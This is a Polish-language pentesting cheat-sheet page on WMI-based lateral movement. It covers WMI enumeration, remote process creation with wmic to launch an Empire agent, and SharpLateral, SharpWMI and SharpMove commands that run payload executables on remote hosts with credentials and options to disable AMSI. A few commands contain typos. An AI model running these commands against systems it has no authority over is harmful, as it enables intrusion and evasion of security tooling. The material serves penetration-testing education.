# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Jak to działa

Procesy mogą być otwierane na hostach, gdzie znana jest nazwa użytkownika oraz hasło lub hash, za pomocą WMI. Komendy są wykonywane przy użyciu WMI przez Wmiexec, co zapewnia półinteraktywną powłokę.

**dcomexec.py:** Wykorzystując różne punkty końcowe DCOM, ten skrypt oferuje półinteraktywną powłokę podobną do wmiexec.py, szczególnie wykorzystując obiekt DCOM ShellBrowserWindow. Obecnie obsługuje obiekty MMC20. Application, Shell Windows i Shell Browser Window. (źródło: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Podstawy WMI

### Przestrzeń nazw

Struktura w hierarchii przypominającej katalog, najwyższym kontenerem WMI jest \root, pod którym zorganizowane są dodatkowe katalogi, zwane przestrzeniami nazw.
Komendy do wyświetlania przestrzeni nazw:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasy w obrębie przestrzeni nazw można wylistować za pomocą:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasy**

Znajomość nazwy klasy WMI, takiej jak win32_process, oraz przestrzeni nazw, w której się znajduje, jest kluczowa dla każdej operacji WMI.  
Polecenia do wyświetlenia klas zaczynających się od `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Wywołanie klasy:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metody

Metody, które są jedną lub więcej funkcjami wykonywalnymi klas WMI, mogą być wykonywane.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeracja

### Status usługi WMI

Polecenia do weryfikacji, czy usługa WMI działa:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informacje o systemie i procesach

Zbieranie informacji o systemie i procesach za pomocą WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Dla atakujących WMI jest potężnym narzędziem do enumeracji wrażliwych danych o systemach lub domenach.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Zdalne zapytania WMI o konkretne informacje, takie jak lokalni administratorzy lub zalogowani użytkownicy, są możliwe przy starannym konstruowaniu poleceń.

### **Ręczne zdalne zapytania WMI**

Ciche identyfikowanie lokalnych administratorów na zdalnej maszynie oraz zalogowanych użytkowników można osiągnąć za pomocą konkretnych zapytań WMI. `wmic` wspiera również odczyt z pliku tekstowego, aby jednocześnie wykonywać polecenia na wielu węzłach.

Aby zdalnie wykonać proces za pomocą WMI, na przykład wdrażając agenta Empire, stosuje się następującą strukturę polecenia, a pomyślne wykonanie jest wskazywane przez wartość zwracaną "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Ten proces ilustruje zdolność WMI do zdalnego wykonywania i enumeracji systemu, podkreślając jego użyteczność zarówno w administracji systemem, jak i w pentestingu.

## Narzędzia automatyczne

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Możesz również użyć **Impacket's `wmiexec`**.


## Odniesienia

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)


{{#include ../../banners/hacktricks-training.md}}
